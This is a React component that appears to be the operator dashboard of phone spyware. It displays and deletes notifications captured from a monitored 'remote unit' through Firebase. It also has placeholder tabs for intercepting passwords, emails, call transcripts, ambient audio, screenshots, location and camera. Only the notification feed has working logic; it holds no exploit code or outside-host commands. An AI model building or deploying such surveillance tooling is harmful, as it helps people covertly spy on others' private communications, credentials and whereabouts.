import React, { useState } from 'react';
import { NotificationCard } from './NotificationCard';
import { SearchBar } from './SearchBar';
import { BrowserTab } from './BrowserTab';
import { 
  Bell, 
  Globe, 
  AlertCircle, 
  WifiOff, 
  Smartphone, 
  CheckCircle2,
  History,
  Key,
  Image as ImageIcon,
  MapPin,
  Camera,
  FolderLock,
  Search,
  Phone,
  Mic,
  Activity,
  Mail
} from 'lucide-react';
import clsx from 'clsx';
import { ref, remove } from 'firebase/database';
import { db } from '../firebase/firebaseConfig';

export const DashboardFeed = ({ 
  deviceId, 
  deviceName, 
  deviceStatus, 
  notifications, 
  error,
  activeTab,
  searchQuery,
  setActiveTab,
  setSearchQuery
}) => {

  const handleDeleteNotification = async (notifId) => {
    try {
      if (!deviceId) return;
      const notifRef = ref(db, `logs/${deviceId}/notifications/${notifId}`);
      await remove(notifRef);
    } catch (err) {
      console.error("Failed to delete notification", err);
    }
  };

  const isSummaryNotification = (n) => {
    const text = (n.content || n.text || n.message || '').toLowerCase();
    const summaryPatterns = [
      /^\d+ new messages?$/,
      /^\d+ new notifications?$/,
      /^\d+ messages? from .*$/
    ];
    return summaryPatterns.some(pattern => pattern.test(text)) && !n.textLines && !n.bigText;
  };

  const filteredNotifications = notifications.filter(n => {
    if (isSummaryNotification(n)) return false;
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    const appName = (n.appName || n.packageName || n.name || '').toLowerCase();
    const title = (n.title || '').toLowerCase();
    const textLines = n.textLines ? (Array.isArray(n.textLines) ? n.textLines.join(' ') : n.textLines) : '';
    const content = (n.content || n.text || n.message || n.bigText || '').toLowerCase();
    const fullContent = (content + ' ' + textLines.toLowerCase());
    return appName.includes(q) || title.includes(q) || fullContent.includes(q);
  });

  if (!deviceId) {
    return (
      <div className="h-[70vh] flex flex-col items-center justify-center text-slate-400">
        <div className="relative">
           <div className="absolute inset-0 bg-blue-500/10 blur-3xl rounded-full"></div>
           <Smartphone className="w-24 h-24 mb-6 text-slate-200 relative z-10" />
        </div>
        <h2 className="text-2xl font-bold text-slate-900 mb-2">Initialize Data Stream</h2>
        <p className="text-slate-500 font-medium">Select a remote unit from the command center to begin monitoring.</p>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-full animate-in fade-in duration-1000">

      {error && (
        <div className="mb-8 p-4 bg-red-950/20 border border-red-900/30 rounded-xl flex items-center gap-4 text-red-500 font-mono animate-in shake duration-500">
          <AlertCircle className="w-5 h-5 flex-shrink-0" />
          <div className="text-[11px] uppercase tracking-wider">
            Critical Data Failure: {error}
          </div>
        </div>
      )}

      {/* Main Content Area */}
      <div className="flex-1">
        {activeTab === 'notifications' && (
          <div className="space-y-4">
            {filteredNotifications.length > 0 ? (
              filteredNotifications.map(notification => (
                <NotificationCard 
                  key={notification.id} 
                  notification={notification} 
                  onDelete={handleDeleteNotification} 
                />
              ))
            ) : (
              <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl">
                <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
                   <Bell className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
                </div>
                <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2">Null Stream</p>
                <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Awaiting remote signal broadcast...</p>
              </div>
            )}
          </div>
        )}

        {activeTab === 'history' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
               <History className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-slate-400">Browser History</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Tracking remote navigation logs...</p>
            <div className="mt-8 flex gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
              <span className="w-2 h-2 rounded-full bg-emerald-500/40 animate-pulse delay-75"></span>
              <span className="w-2 h-2 rounded-full bg-emerald-500/20 animate-pulse delay-150"></span>
            </div>
          </div>
        )}

        {activeTab === 'passwords' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-red-500/50 transition-colors">
               <FolderLock className="w-6 h-6 group-hover:text-red-500 transition-colors text-red-500/50" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-red-500">Encrypted Vault</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest text-slate-500">Accessing protected credential store...</p>
            <div className="mt-8 p-4 bg-slate-950 border border-slate-800 rounded-lg font-mono text-[9px] text-slate-500">
              [SYSTEM_MESSAGE] Unauthorized access attempt logged.
            </div>
          </div>
        )}

        {activeTab === 'emails' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
               <Mail className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-slate-400">Encrypted Inbox</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Intercepting remote SMTP relays...</p>
            <div className="mt-8 p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center gap-3">
              <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
              <span className="text-[10px] font-mono text-emerald-500/70">DECRYPTING_MAIL_STREAM_0XFA2...</span>
            </div>
          </div>
        )}

        {activeTab === 'call_logs' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
               <Phone className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-slate-400">Call Transcripts</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Intercepting remote voice sessions...</p>
            <div className="mt-8 flex flex-col gap-2 w-full max-w-xs">
              <div className="h-1 w-full bg-slate-800 rounded-full overflow-hidden">
                <div className="h-full bg-emerald-500 w-1/3 animate-progress"></div>
              </div>
              <div className="flex justify-between text-[8px] font-mono text-slate-500 uppercase">
                <span>Buffering Stream</span>
                <span>32%</span>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'audio' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
               <Mic className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-slate-400">Audio Surveillance</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Listening to ambient remote pick-up...</p>
            <div className="mt-8 flex items-end gap-1 h-8">
              {[1,2,3,4,5,6,7,8].map(i => (
                <div key={i} className="w-1 bg-emerald-500/40 rounded-full animate-wave" style={{height: `${Math.random() * 100}%`, animationDelay: `${i * 0.1}s`}}></div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'screenshots' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
               <ImageIcon className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-slate-400">Visual Captures</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Retrieving remote frame buffers...</p>
          </div>
        )}

        {activeTab === 'location' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
               <MapPin className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-slate-400">Geo Positioning</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Triangulating remote coordinates...</p>
          </div>
        )}

        {activeTab === 'camera' && (
          <div className="py-24 flex flex-col items-center justify-center text-slate-600 bg-slate-900/20 border border-dashed border-slate-800 rounded-3xl animate-in fade-in zoom-in duration-500">
            <div className="w-16 h-16 rounded-full bg-slate-900 flex items-center justify-center border border-slate-800 mb-6 group hover:border-emerald-500/50 transition-colors">
               <Camera className="w-6 h-6 group-hover:text-emerald-500 transition-colors" />
            </div>
            <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-slate-400">Optical Stream</p>
            <p className="text-[10px] font-medium opacity-60 uppercase tracking-widest">Initializing remote lens access...</p>
          </div>
        )}
      </div>
    </div>
  );
};
